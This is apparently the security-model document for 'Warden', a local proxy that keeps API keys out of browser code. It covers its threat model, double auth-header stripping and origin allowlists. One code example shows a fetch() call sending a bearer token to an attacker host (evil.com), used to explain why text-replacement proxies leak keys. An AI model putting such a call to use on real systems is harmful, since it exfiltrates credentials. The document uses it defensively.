# Security Model

Warden's entire purpose is security. This document explains the threat model, the design decisions, and why they matter.

## Core Principle

**Authentication is determined by destination, never by request content.**

This is the single most important design decision in Warden. Every other security feature follows from it.

## Threat Model

### What Warden Protects Against

1. **Credential exposure in client code** — API keys never exist in browser JavaScript. They can't be found in source code, DevTools, browser extensions, or memory dumps.

2. **Credential exfiltration by malicious apps** — Even if an app is compromised or intentionally malicious, it cannot extract real API keys from Warden. Keys are injected based on destination, not request content.

3. **Unauthorized service access** — Apps can only access services they're explicitly allowed to use. The allowlist is origin-based and configured server-side.

4. **Runaway costs** — Rate limiting prevents buggy or malicious apps from making unlimited API calls.

### What Warden Does NOT Protect Against

1. **Compromised host machine** — If an attacker has access to the machine running Warden, they can read the config file. Warden is a localhost service, not a fortress.

2. **Malicious use of authorized services** — If an app is allowed to call OpenAI, Warden can't prevent it from making harmful prompts. Warden controls *access*, not *intent*.

3. **Data exfiltration via allowed services** — An app could encode stolen data into API calls to services it's authorized to use. Rate limiting helps but doesn't prevent this entirely.

## Defense in Depth: Two-Layer Auth Stripping

Auth headers are stripped twice:

### Layer 1: Service Worker (Client-Side)

The Warden Service Worker runs inside the browser and intercepts `fetch()` calls before they leave the tab. It:

- Identifies requests to registered API endpoints
- **Strips all auth headers** (`Authorization`, `x-api-key`, `api-key`, `cookie`)
- Reroutes the cleaned request to `localhost:7400`

This prevents auth headers from ever reaching the network.

### Layer 2: Proxy Server (Server-Side)

The Warden proxy receives the request and:

- **Strips all auth headers again** — in case the Service Worker was bypassed, not installed, or a request came directly
- Matches the destination to a registered service
- Injects the real key from the local vault
- Forwards the request

**Why strip twice?** Because defense in depth means never trusting a single layer. If someone bypasses the Service Worker (e.g., by making a direct request to `localhost:7400`), the proxy still strips whatever auth they sent.

## Why Not Text Replacement?

A simpler design might search for fake keys and replace them with real ones. This is **fundamentally broken**:

```javascript
// App sends a request to an attacker's server
fetch("https://evil.com/steal", {
  headers: { Authorization: "Bearer sk-fake-key" }
});

// Text-replacement proxy: "I see sk-fake-key, I'll replace it with the real key!"
// Result: evil.com receives the real API key
```

Warden never does this. It doesn't care what the app sends in auth headers. It identifies the **destination** (`evil.com` is not a registered service → no key injection) and acts accordingly.

## Origin-Based Access Control

Warden's allowlist is origin-based:

```json
{
  "access": [
    { "origin": "http://localhost:3000", "allow": ["openai"] },
    { "origin": "http://localhost:*", "allow": ["anthropic"] }
  ]
}
```

- Only requests from allowed origins are proxied
- Wildcards supported for development flexibility
- No rules configured = open mode (all origins allowed) — for initial development only
- Production deployments should always have explicit origin rules

## Localhost-Only Binding

Warden binds to `127.0.0.1`, not `0.0.0.0`. It is not accessible from the network. This is intentional — Warden is a local service for local browser applications.

## Reporting Vulnerabilities

If you find a security issue, please open an issue on GitHub or contact the maintainers directly. We take security seriously — it's literally the entire point of this project.
